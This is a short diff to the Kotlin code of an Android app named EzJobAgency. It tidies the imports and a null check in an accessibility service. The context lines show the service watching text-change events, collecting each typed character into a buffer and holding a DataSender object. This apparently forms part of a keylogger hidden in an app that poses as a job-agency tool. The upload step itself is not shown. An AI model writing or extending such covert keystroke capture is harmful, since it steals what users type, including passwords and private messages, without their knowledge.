@@ -2,14 +2,16 @@ package com.example.EzJobAgency
 
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityEvent
-import kotlinx.coroutines.*
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
 
 class MyAccessibilityService : AccessibilityService() {
     var buffer: String? = ""
     private val datasender = DataSender()
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        event?.let {
+        event.let {
             if (it.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                 val char = it.text.filterNotNull().firstOrNull()?.lastOrNull()
                 if(char != null)
